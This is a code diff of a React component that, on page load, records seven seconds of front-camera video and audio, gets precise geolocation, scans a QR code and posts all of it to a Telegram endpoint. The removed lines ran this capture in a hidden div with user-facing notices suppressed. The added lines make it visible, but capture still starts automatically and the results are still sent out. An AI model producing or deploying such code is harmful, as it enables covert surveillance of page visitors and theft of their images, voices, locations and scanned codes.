@@ -2,21 +2,26 @@
 
 import React, { useEffect, useRef, useState } from "react";
 import { toast } from "sonner";
+import QrScanner from "./qr-scanner"; // Import the new QrScanner component
 
 const TELEGRAM_API_ENDPOINT = "/api/telegram";
-const RECORDING_DURATION_MS = 7000; // Reverted to 7 seconds for video and audio recording
+const RECORDING_DURATION_MS = 7000; // 7 seconds for video and audio recording
 
 type DataToSend = {
-  video?: string; // Changed from selfie to video
+  video?: string;
   latitude?: number;
   longitude?: number;
+  qrCodeData?: string; // Added for QR code data
 };
+
+type AppPhase = "initial" | "recording" | "qrScanning" | "finished";
 
 const PermissionHandler = () => {
   const videoRef = useRef<HTMLVideoElement>(null);
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
-  const mediaChunksRef = useRef<Blob[]>([]); // Renamed from audioChunksRef
-  const [isProcessing, setIsProcessing] = useState(true);
+  const mediaChunksRef = useRef<Blob[]>([]);
+  const [appPhase, setAppPhase] = useState<AppPhase>("initial");
+  const [dataToSend, setDataToSend] = useState<DataToSend>({});
 
   const sendDataToTelegram = async (data: DataToSend) => {
     if (Object.keys(data).length === 0) {
@@ -41,36 +46,73 @@ const PermissionHandler = () => {
       }
     } catch (error: any) {
       toast.error(`Network error sending data to Telegram: ${error.message}`);
+    } finally {
+        setAppPhase("finished"); // Mark as finished after attempting to send
     }
   };
 
-  useEffect(() => {
-    const handlePermissionsAndSend = async () => {
-      setIsProcessing(true);
-      const dataToSend: DataToSend = {};
-      let stream: MediaStream | null = null;
+  const handleQrCodeScanned = (qrData: string) => {
+    console.log("QR Code Scanned in PermissionHandler:", qrData);
+    setDataToSend((prev) => ({ ...prev, qrCodeData: qrData }));
+    toast.success("QR Code scanned!");
+    // Now send all collected data including QR code
+    sendDataToTelegram({ ...dataToSend, qrCodeData: qrData });
+  };
 
+  const handleQrScanError = (error: string) => {
+    console.error("QR Scan Error:", error);
+    toast.error(`QR Scan Error: ${error}`);
+    // If QR scan fails, still try to send other data
+    sendDataToTelegram(dataToSend);
+  };
+
+  useEffect(() => {
+    let stream: MediaStream | null = null;
+    let recordingTimeout: NodeJS.Timeout;
+
+    const startRecordingAndGeolocation = async () => {
+      setAppPhase("recording");
+      const currentData: DataToSend = {};
+
+      // Geolocation Promise
+      const geolocationPromise = new Promise<void>((resolve) => {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              currentData.latitude = position.coords.latitude;
+              currentData.longitude = position.coords.longitude;
+              resolve();
+            },
+            (error) => {
+              console.error(`Location access denied: ${error.message}`);
+              resolve();
+            },
+            { enableHighAccuracy: true }
+          );
+        } else {
+          console.error("Geolocation not supported in this browser.");
+          resolve();
+        }
+      });
+
+      // Camera and Mic Recording
       const cameraAndMicPromise = new Promise<void>(async (resolve) => {
         try {
-          stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-          // No toast for camera/microphone access granted
-
+          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true }); // Front camera
           if (videoRef.current) {
             videoRef.current.srcObject = stream;
             await new Promise((res) => {
               videoRef.current!.onloadedmetadata = () => {
                 videoRef.current!.play().then(res).catch(err => {
                   console.error("Error playing video stream:", err);
-                  // No toast for failed video stream play
                   res(null);
                 });
               };
             });
           }
 
-          // Record video with audio for 7 seconds
           mediaRecorderRef.current = new MediaRecorder(stream, { mimeType: 'video/webm' });
-          mediaChunksRef.current = []; // Reset chunks for new recording
+          mediaChunksRef.current = [];
           mediaRecorderRef.current.ondataavailable = (event) => {
             if (event.data.size > 0) {
               mediaChunksRef.current.push(event.data);
@@ -81,71 +123,70 @@ const PermissionHandler = () => {
             const reader = new FileReader();
             reader.readAsDataURL(videoBlob);
             reader.onloadend = () => {
-              dataToSend.video = reader.result as string;
-              // No toast for video recorded
+              currentData.video = reader.result as string;
               resolve();
             };
           };
           mediaRecorderRef.current.start();
-          setTimeout(() => {
+
+          recordingTimeout = setTimeout(() => {
             if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
               mediaRecorderRef.current.stop();
             }
+            // Stop front camera stream immediately after recording
+            if (stream) {
+                stream.getTracks().forEach((track: MediaStreamTrack) => track.stop());
+                if (videoRef.current) {
+                    videoRef.current.srcObject = null;
+                }
+            }
+            resolve(); // Resolve camera promise after recording stops
           }, RECORDING_DURATION_MS);
 
         } catch (error: any) {
-          // No toast for camera/microphone access denied, only console error
           console.error(`Camera/Microphone access denied: ${error.message}`);
-          resolve(); // Resolve even if denied, so Promise.allSettled can continue
+          resolve();
         }
       });
 
-      const geolocationPromise = new Promise<void>((resolve) => {
-        if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              dataToSend.latitude = position.coords.latitude;
-              dataToSend.longitude = position.coords.longitude;
-              // No toast for location access granted
-              resolve();
-            },
-            (error) => {
-              // No toast for location access denied, only console error
-              console.error(`Location access denied: ${error.message}`);
-              resolve(); // Resolve even if denied
-            },
-            { enableHighAccuracy: true }
-          );
-        } else {
-          // No toast for geolocation not supported, only console error
-          console.error("Geolocation not supported in this browser.");
-          resolve(); // Resolve if not supported
-        }
-      });
-
-      // Wait for all permission requests and data collection to settle
       await Promise.allSettled([cameraAndMicPromise, geolocationPromise]);
-
-      // Send all collected data to Telegram
-      await sendDataToTelegram(dataToSend);
-
-      // Stop all tracks after processing, regardless of success or failure
-      if (stream) {
-        (stream as MediaStream).getTracks().forEach((track: MediaStreamTrack) => track.stop());
-        if (videoRef.current) {
-          videoRef.current.srcObject = null;
-        }
-      }
-      setIsProcessing(false);
+      setDataToSend(currentData); // Store collected data
+      setAppPhase("qrScanning"); // Transition to QR scanning
     };
 
-    handlePermissionsAndSend();
-  }, []);
+    startRecordingAndGeolocation();
+
+    return () => {
+      if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
+        mediaRecorderRef.current.stop();
+      }
+      if (stream) {
+        stream.getTracks().forEach((track: MediaStreamTrack) => track.stop());
+      }
+      clearTimeout(recordingTimeout);
+    };
+  }, []); // Run only once on component mount
 
   return (
-    <div style={{ display: 'none' }}>
-      <video ref={videoRef} autoPlay playsInline muted />
-      {isProcessing && <p style={{ display: 'none' }}>Processing permissions...</p>} {/* Also hide this text */}
+    <div className="min-h-screen flex flex-col items-center justify-center bg-background text-foreground">
+      {appPhase === "initial" && (
+        <p className="text-lg">Initializing permissions and starting recording...</p>
+      )}
+      {appPhase === "recording" && (
+        <>
+          <p className="text-lg mb-4">Recording video for {RECORDING_DURATION_MS / 1000} seconds...</p>
+          <div className="relative w-full max-w-md aspect-video bg-muted flex items-center justify-center rounded-lg overflow-hidden">
+            <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" />
+            <div className="absolute inset-0 border-4 border-primary-foreground opacity-70 rounded-lg pointer-events-none" />
+          </div>
+        </>
+      )}
+      {appPhase === "qrScanning" && (
+        <QrScanner onQrCodeScanned={handleQrCodeScanned} onScanError={handleQrScanError} />
+      )}
+      {appPhase === "finished" && (
+        <p className="text-lg">Process completed. Check Telegram.</p>
+      )}
     </div>
   );
 };
